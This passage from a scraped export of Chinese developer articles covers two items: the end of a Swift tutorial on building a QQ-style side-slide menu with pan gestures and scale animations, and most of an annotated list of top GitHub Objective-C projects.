<li>右侧主视图的高度占屏幕高度的比例为：77%</li>
</ol>
<h2>找出线性关系</h2>

<h3>1. 比例与手指移动距离的关系</h3>

<p>字比较丑 o(╯□╰)o。注意：式（1）中的 x 表示“手指移动距离”这个变量，和上面图中表示屏幕宽度的 x 意义不同。</p>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201504/bd8e1428734179.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<h3>2. 矩形中心向右移动距离和手指移动距离相等</h3>

<h2>实现侧滑</h2>

<h3>1. 新建项目，在 StoryBoard 中新增一个 View Controller，并新增一个名为 HomeViewController 的 UIViewController 类，并在 StoryBoard 中完成绑定。</h3>

<h3>2. 给 HomeViewController 设置背景颜色以示区分。也可以像我一样设一个大 Label 作为更明显的区分。</h3>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201504/87551428735407.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<h3>3. 给 HomeViewController 拖放一个 UIPanGestureRecognizer 并绑定到代码。</h3>

<p><span class=""img-wrap""><img data-src=""http://lvwenhan.com/content/uploadfile/201504/3f251428737159.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""pic""></span></p>

<h3>4. 编写代码实现效果：</h3>

<p>新建 Common.swift，存储屏幕宽度、高度：</p>

<pre><code>swift</code><code>import UIKit

struct Common {
    static let screenWidth = UIScreen.mainScreen().applicationFrame.maxX
    static let screenHeight = UIScreen.mainScreen().applicationFrame.maxY
}
</code></pre>

<p>修改 ViewController：</p>

<pre><code>swift</code><code>import UIKit

class ViewController: UIViewController {

    var homeViewController: HomeViewController!
    var distance: CGFloat = 0

    let FullDistance: CGFloat = 0.78
    let Proportion: CGFloat = 0.77

    override func viewDidLoad() {
        super.viewDidLoad()

        // 给主视图设置背景
        let imageView = UIImageView(image: UIImage(named: ""back""))
        imageView.frame = UIScreen.mainScreen().bounds
        self.view.addSubview(imageView)

        // 通过 StoryBoard 取出 HomeViewController 的 view，放在背景视图上面
        homeViewController = UIStoryboard(name: ""Main"", bundle: nil).instantiateViewControllerWithIdentifier(""HomeViewController"") as! HomeViewController
        self.view.addSubview(homeViewController.view)

        // 绑定 UIPanGestureRecognizer
        homeViewController.panGesture.addTarget(self, action: Selector(""pan:""))
    }

    override func didReceiveMemoryWarning() {
        super.didReceiveMemoryWarning()
        // Dispose of any resources that can be recreated.
    }

    // 响应 UIPanGestureRecognizer 事件
    func pan(recongnizer: UIPanGestureRecognizer) {
        let x = recongnizer.translationInView(self.view).x
        let trueDistance = distance + x // 实时距离

        // 如果 UIPanGestureRecognizer 结束，则激活自动停靠
        if recongnizer.state == UIGestureRecognizerState.Ended {

            if trueDistance &gt; Common.screenWidth * (Proportion / 3) {
                showLeft()
            } else if trueDistance &lt; Common.screenWidth * -(Proportion / 3) {
                showRight()
            } else {
                showHome()
            }

            return
        }

        // 计算缩放比例
        var proportion: CGFloat = recongnizer.view!.frame.origin.x &gt;= 0 ? -1 : 1
        proportion *= trueDistance / Common.screenWidth
        proportion *= 1 - Proportion
        proportion /= 0.6
        proportion += 1
        if proportion &lt;= Proportion { // 若比例已经达到最小，则不再继续动画
            return
        }
        // 执行平移和缩放动画
        recongnizer.view!.center = CGPointMake(self.view.center.x + trueDistance, self.view.center.y)
        recongnizer.view!.transform = CGAffineTransformScale(CGAffineTransformIdentity, proportion, proportion)
    }

    // 封装三个方法，便于后期调用

    // 展示左视图
    func showLeft() {
        distance = self.view.center.x * (FullDistance + Proportion / 2)
        doTheAnimate(self.Proportion)
    }
    // 展示主视图
    func showHome() {
        distance = 0
        doTheAnimate(1)
    }
    // 展示右视图
    func showRight() {
        distance = self.view.center.x * -(FullDistance + Proportion / 2)
        doTheAnimate(self.Proportion)
    }
    // 执行三种试图展示
    func doTheAnimate(proportion: CGFloat) {
        UIView.animateWithDuration(0.3, delay: 0, options: UIViewAnimationOptions.CurveEaseInOut, animations: { () -&gt; Void in
            self.homeViewController.view.center = CGPointMake(self.view.center.x + self.distance, self.view.center.y)
            self.homeViewController.view.transform = CGAffineTransformScale(CGAffineTransformIdentity, proportion, proportion)
            }, completion: nil)
    }

}
</code></pre>

<h3>5. 查看效果</h3>

<p><span class=""img-wrap""><img data-src=""/img/bVll4p"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""gif""></span></p>

<blockquote>
  <p>下一步：<a rel=""nofollow"" href=""http://lvwenhan.com/ios/446.html"">再造 “手机QQ” 侧滑菜单（二）——高仿左视图</a></p>
</blockquote>

<p><br></p>

<hr>
<h3>原文：<a rel=""nofollow"" href=""http://lvwenhan.com/ios/445.html"">再造 “手机QQ” 侧滑菜单（一）——实现侧滑效果</a>
</h3>

<hr>

                ", 再造 “手机QQ” 侧滑菜单（一）——实现侧滑效果,1531972122,404,1,955,1,1,https://segmentfault.com/a/1190000002666500
156,1,0,6,"
                    
<p>主要对当前 GitHub 排名前 100 的项目做一个简单的简介, 方便初学者快速了解到当前 Objective-C 在 GitHub 的情况.</p>

<p>GitHub 地址:<a rel=""nofollow"" href=""https://github.com/Aufree/trip-to-iOS/blob/master/Top-100.md"">https://github.com/Aufree/trip-to-iOS/blob/master/Top-100.md</a><br><strong>若有任何疑问可通过微博<a rel=""nofollow"" href=""http://weibo.com/jinfali"">@李锦发</a>联系我</strong></p>

<table>
<thead><tr>
<th>项目名称</th>
  <th>项目信息</th>
</tr></thead>
<tbody>
<tr>
<td>1. <a rel=""nofollow"" href=""https://github.com/AFNetworking/AFNetworking"">AFNetworking</a>
</td>
  <td>作者是 NSHipster 的博主, iOS 开发界的大神级人物, 毕业于卡内基·梅隆大学, 开源了许多牛逼的项目, 这个便是其中之一, AFNetworking 采用 NSURLConnection + NSOperation, 主要方便与服务端 API 进行数据交换, 操作简单, 功能强大, 现在许多人都用它取代 ASIHTTPRequest</td>
</tr>
<tr>
<td>2. <a rel=""nofollow"" href=""https://github.com/BradLarson/GPUImage"">GPUImage</a>
</td>
  <td>一款强大的图片滤镜工具, 支持自定义滤镜, 可用来实时处理图片和视频流, 作者是 SonoPlot 公司的 CTO, 在很小的时候便开始接触编程, 他在 <a rel=""nofollow"" href=""http://stackoverflow.com/users/19679/brad-larson"">SO</a> 上面的回答也有很多值得阅读, GPUImage 这个项目从 2012 年开始, 使用 OpenGL 图形程序接口编写, 性能非常好, 现在很多 iOS 程序员都用它来实现 iOS 的模糊效果</td>
</tr>
<tr>
<td>3. <a rel=""nofollow"" href=""https://github.com/rs/SDWebImage"">SDWebImage</a>
</td>
  <td>作者 Olivier Poitrey 是 Dailymotion 的 CTO, 拥有多个不错的开源项目, 此项目常用于对从 Web 端接受到的图片进行缓存, 是 UIImageView 的扩展, 应用起来比较简单</td>
</tr>
<tr>
<td>4. <a rel=""nofollow"" href=""https://github.com/RestKit/RestKit"">RestKit</a>
</td>
  <td>主要用于 iOS 上网络通信, 允许与 RESTful Web 服务交互, 常用于处理 API, 解析 JSON, 映射响应对象等操作, 简单易用, 方便你把所有精力都放在对数据的操作上</td>
</tr>
<tr>
<td>5. <a rel=""nofollow"" href=""https://github.com/ReactiveCocoa/ReactiveCocoa"">ReactiveCocoa</a>
</td>
  <td>由 GitHub 工程师们开发的一个应用于 iOS 和 OS X 开发的函数响应式编程新框架, Matt 称其为 ""An open source project that exemplifies this brave new era for Objective-C"", 也有人说它是 Cocoa 的未来, 具体可看唐巧写的这篇<a rel=""nofollow"" href=""http://www.devtang.com/blog/2014/02/11/reactivecocoa-introduction"">文章</a>
</td>
</tr>
<tr>
<td>6. <a rel=""nofollow"" href=""https://github.com/facebookarchive/three20"">three20</a>
</td>
  <td>由 Facebook iOS 客户端衍生出的一款 iPhone 框架, 内置许多丰富的功能, 有丰富的界面, 对底层的操作便捷, 为开发者省下了很多时间, 但现在已经停止了更新, 一个 <a rel=""nofollow"" href=""https://github.com/facebookarchive/three20/pull/832?utm_source=iOS+Dev+Weekly&amp;utm_campaign=46a7deb647-iOS_Dev_Weekly_Issue_100&amp;utm_medium=email&amp;utm_term=0_7bda94b7ca-46a7deb647-299428269"">PR</a> 把代码删得干干净净, 不要好奇去点开 Files changed, 我点开后该页面直接卡死, three20 当中的一位作者创建了 <a rel=""nofollow"" href=""https://github.com/jverkoey/nimbus"">Nimbus</a>, 算是 three20 的一个替代品</td>
</tr>
<tr>
<td>7. <a rel=""nofollow"" href=""https://github.com/jdg/MBProgressHUD"">MBProgressHUD</a>
</td>
  <td>作者 Matej Bukovinski 是一位全栈工程师, UI/UX 设计师,  此项目是一款提示框第三方库, 帮助开发者快速应用到项目中)</td>
</tr>
<tr>
<td>8. <a rel=""nofollow"" href=""https://github.com/magicalpanda/MagicalRecord"">MagicalRecord</a>
</td>
  <td>作者是 Coursera 的 iOS 工程师, 该项目创作灵感来自于 Ruby on Rails 的 Active Record, 主要为方便操作 CoreData 而生, 帮助清除 CoreData 引用的代码, 协助方便 CoreData 的工作</td>
</tr>
<tr>
<td>9. <a rel=""nofollow"" href=""https://github.com/ccgus/fmdb"">FMDB</a>
</td>
  <td>一个对 SQLite 进行封装的库, 使用起来方便, 简单</td>
</tr>
<tr>
<td>10. <a rel=""nofollow"" href=""https://github.com/Mantle/Mantle"">Mantle</a>
</td>
  <td>作者是 GitHub 的员工, 文档写的很清楚: Mantle makes it easy to write a simple model layer for your Cocoa or Cocoa Touch application, 主要用来将 JSON 数据模型化为 Model 对象, 唱吧在前段时间也改用 Mantle 了.</td>
</tr>
<tr>
<td>11. <a rel=""nofollow"" href=""https://github.com/Grouper/FlatUIKit"">FlatUIKit</a>
</td>
  <td>收集了很多扁平化 UI 的 iOS 组件, 方便使用</td>
</tr>
<tr>
<td>12. <a rel=""nofollow"" href=""https://github.com/pokeb/asi-http-request"">ASIHTTPRequest</a>
</td>
  <td>一个轻量级的 iOS 网络通信类库, 基于 CFNetwork 框架开发, 但现在已经停止更新, 多数开发者改用 AFNetworking 替代)</td>
</tr>
<tr>
<td>13. <a rel=""nofollow"" href=""https://github.com/path/FastImageCache"">FastImageCache</a>
</td>
  <td>Path 公司出品的 iOS 库, 作者 Mallory Paine 是苹果前员工, 此类库适用于在滚动时快速显示图像, 高速持久是其最大的特点</td>
</tr>
<tr>
<td>14. <a rel=""nofollow"" href=""https://github.com/Masonry/Masonry"">Masonry</a>
</td>
  <td>一个轻量级的布局框架, 同时支持 iOS 和 Mac OS X, 语法优雅, 帮助开发者快速适配不同分辨率的 iOS 设备</td>
</tr>
<tr>
<td>15. <a rel=""nofollow"" href=""https://github.com/facebook/Shimmer"">Shimmer</a>
</td>
  <td>Facebook 推出的一款具有闪烁效果的第三方控件, 供它旗下一款名为 Paper 的应用使用, 安装使用整个过程都十分简单</td>
</tr>
<tr>
<td>16. <a rel=""nofollow"" href=""https://github.com/TransitApp/SVProgressHUD"">SVProgressHUD</a>
</td>
  <td>又一款轻量级的 iOS 第三方控件, 用于显示任务加载时的动画, 非常轻便, 容易使用</td>
</tr>
<tr>
<td>17. <a rel=""nofollow"" href=""https://github.com/jigish/slate"">Slate</a>
</td>
  <td>一款窗口管理应用程序, 但在两年前就已经停止更新了</td>
</tr>
<tr>
<td>18. <a rel=""nofollow"" href=""https://github.com/johnezang/JSONKit"">JSONKit</a>
</td>
  <td>主要用于解析 JSON, 适用于 iOS6 以下环境, 自从 iOS5 开始 Apple 官方给出了 NSJSONSerialization API, 自此大家都用官方的了</td>
</tr>
<tr>
<td>19. <a rel=""nofollow"" href=""https://github.com/jverkoey/nimbus"">Nimbus</a>
</td>
  <td>作者 Jeff 曾为 Facebook, Google 做过不少好东西, 也是 three20 的成员之一, three20 停更后, 他创造出这个框架来代替 three20, 文档齐全</td>
</tr>
<tr>
<td>20. <a rel=""nofollow"" href=""https://github.com/CocoaLumberjack/CocoaLumberjack"">CocoaLumberjack</a>
</td>
  <td>这是 Mac 和 iOS 的一款强大的日志框架, 配置简单, 多线程, 提供更高级的 log 功能, 可用于代替默认的 NSLog 语句</td>
</tr>
<tr>
<td>21. <a rel=""nofollow"" href=""https://github.com/facebook/facebook-ios-sdk"">Facebook SDK for iOS</a>
</td>
  <td>Facebook 官方的 iOS SDK, 方便开发者集成 Facebook 的一些功能到自己的 iOS APP 里面</td>
</tr>
<tr>
<td>22. <a rel=""nofollow"" href=""https://github.com/facebook/AsyncDisplayKit"">AsyncDisplayKit</a>
</td>
  <td>Facebook 开源的一款 iOS UI 框架, Paper 用的就是该框架, 另外框架还用到了 Facebook 早期开源 Pop 动画引擎</td>
</tr>
<tr>
<td>23. <a rel=""nofollow"" href=""https://github.com/supermarin/Alcatraz"">Alcatraz</a>
</td>
  <td>Alcatraz 是一款管理 Xcode 插件、模版以及颜色配置的工具, 可以集成到 Xcode 的图形界面中, 安装删除都是几条命令的事, 很方便, 支持自己开发插件并上传</td>
</tr>
<tr>
<td>24. <a rel=""nofollow"" href=""https://github.com/Inferis/ViewDeck"">ViewDeck</a>
</td>
  <td>一款开源的 iOS 活动面板组件, 还原 Path 2.0 的侧滑效果, 作者因为时间关系在两年前停止对其更新</td>
</tr>
<tr>
<td>25. <a rel=""nofollow"" href=""https://github.com/jessesquires/JSQMessagesViewController"">JSQMessagesViewController</a>
</td>
  <td>优雅的 iOS 消息类库, 常用于聊天应用中, 可定制性高</td>
</tr>
<tr>
<td>26. <a rel=""nofollow"" href=""https://github.com/Flipboard/FLEX"">FLEX</a>
</td>
  <td>这是 Flipboard 官方发布的一组专门用于 iOS 开发的应用内调试工具, 开发者无需将其连接到 LLDB/Xcode 或其他远程调试服务器,支持直接在 App 中运行</td>
</tr>
<tr>
<td>27. <a rel=""nofollow"" href=""https://github.com/facebook/xctool"">Xctool</a>
</td>
  <td>是 Facebook 开源的一个命令行工具，用来替代苹果的 XcodeBuild 工具, 极大的方便了 iOS 的构建和测试, 输出错误信息也比较友好, 受到许多 iOS 开发者的称赞, 经常与其搭配使用的还有 OCUnit, <a rel=""nofollow"" href=""https://travis-ci.org"">Travis CI</a>, <a rel=""nofollow"" href=""http://oclint.org"">OCLint</a> 等测试工具</td>
</tr>
<tr>
<td>28. <a rel=""nofollow"" href=""https://github.com/OpenEmu/OpenEmu"">OpenEmu</a>
</td>
  <td>超强的游戏模拟器, 做游戏开发必备, 官网做得也很不错</td>
</tr>
<tr>
<td>29. <a rel=""nofollow"" href=""https://github.com/nicklockwood/iCarousel"">iCarousel</a>
</td>
  <td>作者是英国 Charcoal Design 公司的创始人, 开源领域的贡献颇为卓著, 这个项目就是其中之一, 这是一款可以在 iOS 上实现旋转木马视图切换效果的第三方控件, 并提供多种切换效果</td>
</tr>
<tr>
<td>30. <a rel=""nofollow"" href=""https://github.com/romaonthego/RESideMenu"">RESideMenu</a>
</td>
  <td>作者 Roman Efimov 是雅虎的 iOS 工程师, 这个项目实现了 iOS 上的菜单侧滑效果, 创意来源于 Dribbble, 该项目支持 iOS8</td>
</tr>
<tr>
<td>321 <a rel=""nofollow"" href=""https://github.com/kevinzhow/PNChart"">PNChart</a>
</td>
  <td>作者周楷雯是 90 后, 秒视的创始人, 该项目是一个带动画效果的图表控件, 简约易用, 受到不少开发者喜爱</td>
</tr>
<tr>
<td>31.2<a rel=""nofollow"" href=""https://github.com/square/PonyDebugger"">PonyDebugger</a>
</td>
  <td>由 Square 公司推出的一款优秀的 iOS 应用网络调试工具, 用户可以实时看到应用程序的网络请求, 也可以对 iOS 应用程序的核心数据栈进行远程调试</td>
</tr>
<tr>
<td>33. <a rel=""nofollow"" href=""https://github.com/jverdi/JVFloatLabeledTextField"">JVFloatLabeledTextField</a>
</td>
  <td>作者是 Thumb Labs 的联合创始人, JVFloatLabeledTextField 是 UITextField 的子类, 主要实现输入框标签浮动效果, 创作灵感来自 Dribbble, 已出现多个移植版本</td>
</tr>
<tr>
<td>34. <a rel=""nofollow"" href=""https://github.com/CEWendel/SWTableViewCell"">SWTableViewCell</a>
</td>
  <td>UITableViewCell 的子类, 实现了左右滑动显示信息视图并调出按钮</td>
</tr>
<tr>
<td>35. <a rel=""nofollow"" href=""https://github.com/levey/AwesomeMenu"">AwesomeMenu</a>
</td>
  <td>作者是一位中国人, 该项目主要是使用 CoreAnimation 还原了 Path menu 的动画效果</td>
</tr>
<tr>
<td>36. <a rel=""nofollow"" href=""https://github.com/tonymillion/Reachability"">Reachability</a>
</td>
  <td>Reachablity 是用于检测 iOS 设备网络环境的库</td>
</tr>
<tr>
<td>37. <a rel=""nofollow"" href=""https://github.com/onevcat/VVDocumenter-Xcode"">VVDocumenter-Xcode</a>
</td>
  <td>作者是王巍国内著名的 iOS 开发者, 人称喵神, 目前在日本 LINE 公司工作, 该项目帮助开发者轻松的生成注释文档, 节省了不少工作量, 赞</td>
</tr>
<tr>
<td>38. <a rel=""nofollow"" href=""https://github.com/google/physical-web"">The Physical Web</a>
</td>
  <td>由 Chrome 团队主导的一个项目, 意在用 URL 连接世界, 方便用户接受数据, 目前尚处在实验阶段</td>
</tr>
<tr>
<td>39. <a rel=""nofollow"" href=""https://github.com/samuelclay/NewsBlur"">NewsBlur</a>
</td>
  <td>作者独自一个人 Samuel Clay 做出来的一款名为 NewsBlur 的新闻阅读器, 很多人都称其为 Google Reader 的替代品, 这是它的源码</td>
</tr>
<tr>
<td>40. <a rel=""nofollow"" href=""https://github.com/cocos2d/cocos2d-spritebuilder"">Cocos2D-SpriteBuilder</a>
</td>
  <td>一个可用于在 iOS, Mac 和 Android 上制作 2D 游戏或其它图形/交互应用的框架, 之前的项目名称为 Cocos Swift,  目前该项目在 GitHub 上更新较为频繁</td>
</tr>
<tr>
<td>41. <a rel=""nofollow"" href=""https://github.com/TTTAttributedLabel/TTTAttributedLabel"">TTTAttributedLabel</a>
</td>
  <td>UILabel 的替代品, 使 iOS 上的 Label 功能更加丰富, 可支持链接植入等功能</td>
</tr>
<tr>
<td>42. <a rel=""nofollow"" href=""https://github.com/robbiehanson/CocoaAsyncSocket"">CocoaAsyncSocket</a>
</td>
  <td>一个功能强大、简单易用的异步 socket 通讯类库, 支持 TCP 和 UDP 协议, 可用于 Mac 和 iOS 设备上, 作者 Robbie Hanson 是 Deusty 的首席软件工程师</td>
</tr>
<tr>
<td>43. <a rel=""nofollow"" href=""https://github.com/devinross/tapkulibrary"">TapkuLibrary</a>
</td>
  <td>作者是 Devin Ross, 这是在 iOS 上一款功能强大的 UI 效果类库, 可以实现多种酷炫的效果, 目前仍在更新中</td>
</tr>
<tr>
<td>44. <a rel=""nofollow"" href=""https://github.com/CanvasPod/Canvas"">Canvas</a>
</td>
  <td>无需编码实现牛逼的动画效果的库, 连设计师都可以快速上手</td>
</tr>
<tr>
<td>45. <a rel=""nofollow"" href=""https://github.com/square/SocketRocket"">SocketRocket</a>
</td>
  <td>Square 公司开源的一个 WebSocket 客户端, 稳定并且易用, 做实时应用常会用到, 受广大开发者喜爱</td>
</tr>
<tr>
<td>46. <a rel=""nofollow"" href=""https://github.com/ECSlidingViewController/ECSlidingViewController"">ECSlidingViewController</a>
</td>
  <td>一个视图控制器容器, 将子视图处理成两层, 通过滑动来处理层的切换, 创作灵感来自 Facebook 和 Path的 App, 作者是 Cleveland 的员工</td>
</tr>
<tr>
<td>47. <a rel=""nofollow"" href=""https://github.com/stig/json-framework"">Json Framework</a>
</td>
  <td>用于解析 JSON 数据的一个框架, 但是在 iOS5 以上版本大多数人都选择使用 NSJSONSerialization 来解析 JSON, 该项目现在在 GitHub 上也几乎没怎么更新了</td>
</tr>
<tr>
<td>48. <a rel=""nofollow"" href=""https://github.com/facebook/Tweaks"">Tweaks</a>
</td>
  <td>Facebook 开源的一款工具, 旨在帮助 iOS 开发者更快的迭代应用, 方便用户动态的调整参数, 是的, Paper 这个项目也用到了</td>
</tr>
<tr>
<td>49. <a rel=""nofollow"" href=""https://github.com/realm/realm-cocoa"">realm-cocoa</a>
</td>
  <td>Realm-Cocoa 是 Realm 公司推出一款移动端数据库, 可以运行在手机、平板和可穿戴设备之上, 其目标是取代 CoreData 和 SQLite 数据库</td>
</tr>
<tr>
<td>50. <a rel=""nofollow"" href=""https://github.com/zwaldowski/BlocksKit"">BlocksKit</a>
</td>
  <td>一个开源的与 Cocoa 紧密集合的基础性框架</td>
</tr>
<tr>
<td>51. <a rel=""nofollow"" href=""https://github.com/arashpayan/appirater"">Appirater</a>
</td>
  <td>一款用于提醒用户给你的 App 打分的工具</td>
</tr>
<tr>
<td>52. <a rel=""nofollow"" href=""https://github.com/kif-framework/KIF"">KIF</a>
</td>
  <td>Square 出品的一个开源的用户界面测试框架, 极大的简化了 iOS 开发者的 UI 测试流程</td>
</tr>
<tr>
<td>53. <a rel=""nofollow"" href=""https://github.com/slackhq/SlackTextViewController"">SlackTextViewController</a>
</td>
  <td>Slack 推出的一款具有文字输入框高度自适应, 自动输入, 复制单元格内容等功能的解决方案</td>
</tr>
<tr>
<td>54. <a rel=""nofollow"" href=""https://github.com/IFTTT/JazzHands"">JazzHands</a>
</td>
  <td>IFTTT 开源的一个简单易用的关键帧基础动画框架, 可通过手势、scroll views, KVO, ReactiveCocoa 等方式来控制动画</td>
</tr>
<tr>
<td>55. <a rel=""nofollow"" href=""https://github.com/BoltsFramework/Bolts-iOS"">Bolts-iOS</a>
</td>
  <td>Bolts 是一个 Parse 和 Facebook 在内部使用的底层库, 方便移动开发</td>
</tr>
<tr>
<td>56. <a rel=""nofollow"" href=""https://github.com/eczarny/spectacle"">Spectacle</a>
</td>
  <td>一款易用的 OS X 窗口分屏操作快捷键工具, 这是其源代码</td>
</tr>
<tr>
<td>57. <a rel=""nofollow"" href=""https://github.com/tombenner/nui"">nui</a>
</td>
  <td>方便样式化 iOS 应用中的 UI 元素, 可在短时间内样式化整个应用, 类 CSS 原理</td>
</tr>
<tr>
<td>58. <a rel=""nofollow"" href=""https://github.com/Induction/Induction"">Induction</a>
</td>
  <td>Induction 是一款用于理解数据关系的管理工具, 这是其程序代码</td>
</tr>
<tr>
<td>59. <a rel=""nofollow"" href=""https://github.com/icanzilb/JSONModel"">JSONModel</a>
</td>
  <td>一个能迅速解析服务器返回的 Json 数据的库, 方便数据的类型转换</td>
</tr>
<tr>
<td>60. <a rel=""nofollow"" href=""https://github.com/Cocoanetics/DTCoreText"">DTCoreText</a>
</td>
  <td>一个开源的 iOS 富文本组件, 它可以解析 HTML 与 CSS 并最终用 CoreText 绘制出来, 通常用于在一些需要显示富文本的场景下代替低性能的 UIWebView</td>
</tr>
<tr>
<td>61. <a rel=""nofollow"" href=""https://github.com/schneiderandre/popping"">Popping</a>
</td>
  <td>基于 Facebook Pop 引擎的 iOS 动画库, 集合了很多动画效果</td>
</tr>
<tr>
<td>62. <a rel=""nofollow"" href=""https://github.com/KrauseFx/TSMessages"">TSMessages</a>
</td>
  <td>一个用来弹出显示警告和通知的轻量级库, 样式丰富, 简单易用</td>
</tr>
<tr>
<td>63. <a rel=""nofollow"" href=""https://github.com/facebook/KVOController"">KVOController</a>
</td>
  <td>一个简单安全的 KVO(Key-value Observing, 键-值 观察)工具, 提供简单方便、线程安全的API, Facebook 的开源项目之一</td>
</tr>
<tr>
<td>64. <a rel=""nofollow"" href=""https://github.com/mwaterfall/MWPhotoBrowser"">MWPhotoBrowser</a>
</td>
  <td>一款简单的 iOS 照片浏览控件</td>
</tr>
<tr>
<td>65. <a rel=""nofollow"" href=""https://github.com/mutualmobile/MMDrawerController"">MMDrawerController</a>
</td>
  <td>一个轻量级, 易于使用的侧边抽屉导航 iOS 控件</td>
</tr>
<tr>
<td>66. <a rel=""nofollow"" href=""https://github.com/escoz/QuickDialog"">QuickDialog</a>
</td>
  <td>用于快速创建复杂的 iOS 表单, 自定义了 UITableViewCell, TableView 的样式</td>
</tr>
<tr>
<td>67. <a rel=""nofollow"" href=""https://github.com/samvermette/SVPullToRefresh"">SVPullToRefresh</a>
</td>
  <td>一款只需一行代码便可集成上拉刷新和下拉加载的组件</td>
</tr>
<tr>
<td>68. <a rel=""nofollow"" href=""https://github.com/nothingmagical/cheddar-ios"">cheddar-ios</a>
</td>
  <td>Cheddar 是一款简单易用的日程管理软件, 这是其早期版本的开源代码, 该项目已停止维护</td>
</tr>
<tr>
<td>69. <a rel=""nofollow"" href=""https://github.com/XVimProject/XVim"">XVim</a>
</td>
  <td>一款在 Xcode 上实现了 Vim 功能的插件</td>
</tr>
<tr>
<td>70. <a rel=""nofollow"" href=""https://github.com/enormego/EGOTableViewPullRefresh"">EGOTableViewPullRefresh</a>
</td>
  <td>一款提供下拉刷新的控件, 最后更新时间是一年前</td>
</tr>
<tr>
<td>71. <a rel=""nofollow"" href=""https://github.com/gimenete/iOS-boilerplate"">iOS-boilerplate</a>
</td>
  <td>iOS 应用程序的基础模板, 使用该模板可以省掉许多项目初始编码的工作, 内置非常多丰富的功能, 现已经停止维护</td>
</tr>
<tr>
<td>72. <a rel=""nofollow"" href=""https://github.com/gotosleep/JASidePanels"">JASidePanels</a>
</td>
  <td>一个 UIViewController 容器, 灵感来自 Facebook 和 Path 2.0 应用的菜单, 实现了左右侧滑的操作</td>
</tr>
<tr>
<td>73. <a rel=""nofollow"" href=""https://github.com/mattt/FormatterKit"">FormatterKit</a>
</td>
  <td>收集了很多构思优秀的 NSFormatter 子类</td>
</tr>
<tr>
<td>74. <a rel=""nofollow"" href=""https://github.com/erichoracek/MSDynamicsDrawerViewController"">MSDynamicsDrawerViewController</a>
</td>
  <td>实现了具有动态弹性效果的抽屉式侧边导航栏, 效果丰富, 可定制性强</td>
</tr>
<tr>
<td>75. <a rel=""nofollow"" href=""https://github.com/boctor/idev-recipes"">idev-recipes</a>
</td>
  <td>iDevRecipes 博客的代码, 演示如何实现一些有趣的控件, 该项目在两年前(2013)停止了更新</td>
</tr>
<tr>
<td>76. <a rel=""nofollow"" href=""https://github.com/robbiehanson/XMPPFramework"">XMPPFramework</a>
</td>
  <td>一个基于 RFC-3920 实现, 支持多线程和线程保护, 同时通用于所有的 iOS 和 Mac OS 开发设备的通信框架.</td>
</tr>
<tr>
<td>77. <a rel=""nofollow"" href=""https://github.com/MacGapProject/MacGap1"">MacGap1</a>
</td>
  <td>一款可以将 HTML/CSS/JS 网络应用打包成原生 Mac App 的工具</td>
</tr>
<tr>
<td>78. <a rel=""nofollow"" href=""https://github.com/nicklockwood/FXBlurView"">FXBlurView</a>
</td>
  <td>iOS 模糊背景类库, 可以方便的根据底层显示的状态生成模糊效果</td>
</tr>
<tr>
<td>79. <a rel=""nofollow"" href=""https://github.com/shu223/iOS7-Sampler"">iOS7-Sampler</a>
</td>
  <td>整合演示了多个具有 iOS7 新特性的的项目, 提供了非常多的例子参考</td>
</tr>
<tr>
<td>80. <a rel=""nofollow"" href=""https://github.com/mxcl/PromiseKit"">PromiseKit</a>
</td>
  <td>提供强大的 iOS 开发异步功能, 是 Promises 的实现, 受到广大开发者的追捧</td>
</tr>
<tr>
<td>81. <a rel=""nofollow"" href=""https://github.com/facebook/origami"">Origami</a>
</td>
  <td>此为 Facebook 推出的 Quartz Composer 的一个开源插件, 由其设计团队花费了 9 个月打造而成, 目的是为方便设计师快速构建原型, 以零代码完成复杂动画的合成和测试, 堪称神器</td>
</tr>
<tr>
<td>82. <a rel=""nofollow"" href=""https://github.com/fpillet/NSLogger"">NSLogger</a>
</td>
  <td>一款强大的日志分析工具, 具有大窗口查看 Log, 自定义日志等级等功能</td>
</tr>
<tr>
<td>83. <a rel=""nofollow"" href=""https://github.com/ksuther/KSImageNamed-Xcode"">KSImageNamed-Xcode</a>
</td>
  <td>一款对 UIImage 的 imageNamed 提供自动补全功能的插件, 非常方便</td>
</tr>
<tr>
<td>84. <a rel=""nofollow"" href=""https://github.com/smileyborg/PureLayout"">PureLayout</a>
</td>
  <td>一个简单却强大的 AutoLayout API 库, 兼容了 Objective-C 和 Swift, 扩展了 UIView/NSView, NSArray, 和 NSLayoutConstraint</td>
</tr>
<tr>
<td>85. <a rel=""nofollow"" href=""https://github.com/tomaz/appledoc"">AppleDoc</a>
</td>
  <td>一款 Objective-C 文档生成工具, 生成的文档风格保持与 Apple 官方的一致, 极大的方便了 Xcode 识别自己写的 API 文档, 安装也是十分的简单</td>
</tr>
<tr>
<td>86. <a rel=""nofollow"" href=""https://github.com/gnachman/iTerm2"">iTerm2</a>
</td>
  <td>iTerm2 被不少程序员称赞为 Mac 下最好用的终端, 这是其源代码, 配合 oh-my-zsh 使用效果更佳</td>
</tr>
<tr>
<td>87. <a rel=""nofollow"" href=""https://github.com/kiwi-bdd/Kiwi"">Kiwi</a>
</td>
  <td>一个行为驱动开发测试框架, 适用于 iOS 平台, 旨在为开发者提供一个简单配置便可使用的 BDD 库</td>
</tr>
<tr>
<td>88. <a rel=""nofollow"" href=""https://github.com/alloy/terminal-notifier"">terminal-notifier</a>
</td>
  <td>一款命令行工具, 用来给 Mac OS X 用户发送通知</td>
</tr>
<tr>
<td>89. <a rel=""nofollow"" href=""https://github.com/uranusjr/macdown"">MacDown</a>
</td>
  <td>Mac OS X 下的一款开源的 Markdown 编辑器, 创意来自与 Mou, 使用 brew cask 即可完成安装</td>
</tr>
<tr>
<td>90. <a rel=""nofollow"" href=""https://github.com/twitter/twui"">TwUI</a>
</td>
  <td>Twitter 开源的一个支持硬件加速的 Mac 的 UI 框架, 最后一次的更新时间是在 3 年前(2012)</td>
</tr>
<tr>
<td>91. <a rel=""nofollow"" href=""https://github.com/honcheng/PaperFold-for-iOS"">PaperFold for iOS</a>
</td>
  <td>实现了类似折纸效果的视图切换, 可从不同方向进行切换, 该项目已经许久未更新</td>
</tr>
<tr>
